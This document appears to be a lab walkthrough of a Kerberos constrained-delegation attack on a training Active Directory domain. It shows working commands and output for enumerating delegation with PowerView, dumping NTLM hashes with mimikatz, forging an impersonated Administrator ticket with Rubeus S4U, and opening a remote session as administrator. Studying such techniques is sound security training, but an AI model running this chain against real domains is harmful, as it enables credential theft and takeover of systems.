# Constrained Delegation

## Enumeration

```pwsh
PS C:\Users\carole.holmes> Get-DomainComputer -TrustedToAuth
```

```output title="Output" hl_lines="8 22 29"
logoncount                    : 67
badpasswordtime               : 12/31/1600 6:00:00 PM
distinguishedname             : CN=DMZ01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 1/27/2025 6:29:20 AM
objectsid                     : S-1-5-21-1870146311-1183348186-593267556-1118
samaccountname                : DMZ01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : DMZ01
accountexpires                : NEVER
whenchanged                   : 1/27/2025 12:29:20 PM
instancetype                  : 4
usncreated                    : 12870
objectguid                    : eaebb114-2638-40ec-9617-8715c4d3057a
operatingsystem               : Windows Server 2019 Standard
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 6:00:00 PM
msds-allowedtodelegateto      : {www/WS01.INLANEFREIGHT.LOCAL, www/WS01}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {tapinego/DMZ01, tapinego/DMZ01.INLANEFREIGHT.LOCAL, WSMAN/DMZ01, WSMAN/DMZ01.INLANEFREIGHT.LOCAL...}
lastlogon                     : 1/27/2025 6:29:37 AM
iscriticalsystemobject        : False
usnchanged                    : 143419
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 10/14/2022 12:10:03 PM
primarygroupid                : 515
pwdlastset                    : 3/23/2023 10:20:32 AM
msds-supportedencryptiontypes : 28
name                          : DMZ01
dnshostname                   : DMZ01.INLANEFREIGHT.LOCAL
```

## Getting Computer Hash

```pwsh
PS C:\Users\carole.holmes> C:\Tools\mimikatz.exe privilege::debug sekurlsa::msv exit
```

```output title="Output" hl_lines="12"
Authentication Id : 0 ; 344379 (00000000:0005413b)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/27/2025 6:29:22 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 93519a5590fd9dffb59ad34017dfa5ad
         * SHA1     : c07ff173afafbc42bb864ca037c0195c24e8b331

Authentication Id : 0 ; 367940 (00000000:00059d44)
Session           : RemoteInteractive from 2
User Name         : carole.holmes
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 1/27/2025 6:29:23 AM
SID               : S-1-5-21-1870146311-1183348186-593267556-1106
        msv :
         [00000003] Primary
         * Username : carole.holmes
         * Domain   : INLANEFREIGHT
         * NTLM     : 37ef72fcf42a4021948c7ed7b33ccf21
         * SHA1     : 78c2ae990df6691d1b07249c1c261522bcc8a8a4
         * DPAPI    : 25a764a34f8d9ea6128fea463abfefa1
```

## Requesting a TGS Ticket

!!! abstract

    * TGT talep edilerek DMZ01$ kapsamına girildi.
    * Administrator adına [forwardable](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_4c6cd79b-120d-4ee1-ab24-d1b000e0b3ca) bir TGS bileti almak için S4U2self isteği yapıldı.
    * [SPN](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names) değeri güncellendi.
    * Elde edilen TGS bileti kullanılarak S4U2proxy isteği yapıldı.

```pwsh
PS C:\Users\carole.holmes> C:\Tools\Rubeus.exe s4u /ptt /user:DMZ01$ /impersonateuser:Administrator /msdsspn:www/WS01.INLANEFREIGHT.LOCAL /altservice:http /rc4:93519A5590FD9DFFB59AD34017DFA5AD
```

```output title="Output" hl_lines="4 38 42 72 74"
[*] Action: S4U

[*] Using rc4_hmac hash: 93519A5590FD9DFFB59AD34017DFA5AD
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\DMZ01$'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      UkVJR0hULkxPQ0FM


[*] Action: S4U

[*] Building S4U2self request for: 'DMZ01$@INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2self request to 172.16.99.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'DMZ01$@INLANEFREIGHT.LOCAL'
[*] base64(ticket.kirbi):

      doIGDDCCBgigAwIBBaEDAgEWooIFDDCCBQhhggUEMIIFAKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiEzARoAMCAQGhCjAIGwZETVowMSSjggTLMIIEx6ADAgESoQMCAQOiggS5BIIEtVchHZll7uzfwccd
      duSJmMw4RviLhzW0JmwgNJRkOfFFdsrS11SiOBy/9n3Bco4xyal6PG9O3Ghu888E2hJKTH+fMSnkX9J4
      zfgeaBeagGBYBqAXbgeNUm1QCTTROLJXt894DxdHah50HUMozFUuuUlYupru4mw2zlHanSyxzKy3Rq1w
      h6DDC9tJPt1lhobaXF9wkgTQ5QRILl4ZkBF9VvyfEU03RiWcgOJuYbDHq34iXYHqiXUFojV0HKG/OyTE
      IWkEtyHbOWIux1MyjNbvteOE81m9rPe+DHSCA/YrjyiaenOQQdzWdaOZtmRUBw0KZyZaw6RXx9WWKul+
      7mhks7XVlvdtFODndA+RA0eWwUEIYQ9sS2I/pwF7nmqxEnG1TEhIOmJyRo++147x0dLNA8KRCKYVZIpC
      mveFqo7riClZf7y3AWAdv8G8+IB5qJSfatRtR7hpSL+tJOn1l+dkQGfaufDCiB7BW4diflXQA/XPtKEV
      GHaenWnHlZR4j811hhT18gIPoCdQjjmg47tluGX5DOnOi4i8L5W1g+6dksLIcmjVeh675PXtaxpMbavJ
      0LjwD3msXoSahxUw+tI0cYypeV80CaV85hHsVLbZNRMzhUVIMJIQpaFqy65V722KJEuUXHc3qWwXy+k/
      V/9PjVwLibr+vAxVss2EeoWrL0QQUk5FshwzIcBiuUEAHpNGg+rzVCVNDIf1BbLg5JdIT7sZi8+kYOXy
      Z6YmibLq9bKHpqsoG1c825TRoYAdCuLIdws75AJep4BApLGf447umEskavefCIFeQkdMLm7AjSet/eAz
      T32q+NdOlVa92NaXgu90JNLa7lYLyVEzTd3r1ZUjy1jqp7xpcVCVLSLY7l4KSyH25EvIs5oPzEK6QiUX
      ZdgPQdNWZ1iFQPwFv4et/iszuvqKuhW1CBIj4sPUPeqAg5MGlgj0rxu9gD0xdg3aBRCi2ZpmzN/Zt21a
      JlhfhwybsbQBv19rrlDy9E2DNxdir24JuUobFW9LBPOFLEUBVy4P0VeXy1gUB6H5z+/FgQ6aErquhk8y
      6LA0S+DEVEAmswDFd448FGObQulWc18pimVpVC2YT/3xTL1ZRx+K2yoIRI4vaGgi0SivEBrTSCfR7ZyH
      qiZS6rcC4uSz0e4bZdtCIuAzSRlWTUofM5Ai4DonFYx2G+QTs8v7P5MR7lGaCjvFkFqT8vB2H1jdmt8g
      Qh56XP/I/IJ7nuXe0PeMJ1mCKb8v/uMw+9j79fWwqdzSfzu+XTTHw/7qjIlsf7WEizOkstq+A9doSBhs
      DtWlhTNJdaQn9BYa7Fl3xEOq7FVfWhsdjXCLtsRvbP7N2dbNWAsgngOzAspy5WURWUpd2hLZraaqoifX
      ORzK7VpNO9b8bvfpzmNrs11dWF2cBHUQ76FZ8kn9fJq1HebKKczqWyR+7xS13XvJs6b4Zt5ZoxWkjsYO
      bUUMqno/SptKhB4CDcJLmQGN+Nv0X1eelj24PosM383szAXFXsRnC+9DbpwxaX5KGMthh/LvcjSSZh1+
      WAeWfQJe3nwC2b+nX5LrCXv+6fkhVJUIKLcSm3dWu3lfDdSU6R3OT6iSw5nDfQPZVVLuUTFWo4HrMIHo
      oAMCAQCigeAEgd19gdowgdeggdQwgdEwgc6gKzApoAMCARKhIgQgfcA5FL/novVF5ypfF0R7AXxNm1xL
      ThZkF10eH1JU6OmhFRsTSU5MQU5FRlJFSUdIVC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0
      b3KjBwMFAEChAAClERgPMjAyNTAxMjcxMzA1MDlaphEYDzIwMjUwMTI3MjMwNTA5WqcRGA8yMDI1MDIw
      MzEzMDUwOVqoFRsTSU5MQU5FRlJFSUdIVC5MT0NBTKkTMBGgAwIBAaEKMAgbBkRNWjAxJA==

[*] Impersonating user 'Administrator' to target SPN 'www/WS01.INLANEFREIGHT.LOCAL'
[*]   Final ticket will be for the alternate service 'http'
[*] Building S4U2proxy request for service: 'www/WS01.INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2proxy request to domain controller 172.16.99.3:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'http'
[*] base64(ticket.kirbi) for SPN 'http/WS01.INLANEFREIGHT.LOCAL':

      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
      dHAbGFdTMDEuaW5sYW5lZnJlaWdodC5sb2NhbA==
[+] Ticket successfully imported!
```

## Verifying the Ticket

```pwsh
PS C:\Users\carole.holmes> klist
```

```output title="Output" hl_lines="5-6 8"
Current LogonId is 0:0x59cf3

Cached Tickets: (1)

#0>     Client: Administrator @ INLANEFREIGHT.LOCAL
        Server: http/WS01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 1/27/2025 7:05:09 (local)
        End Time:   1/27/2025 17:05:09 (local)
        Renew Time: 2/3/2025 7:05:09 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

## Remote Access

```pwsh
PS C:\Users\carole.holmes> Enter-PSSession WS01.INLANEFREIGHT.LOCAL
[WS01.INLANEFREIGHT.LOCAL]: PS C:\Users\Administrator.INLANEFREIGHT\Documents> whoami
```

```output title="Output"
inlanefreight\administrator
```
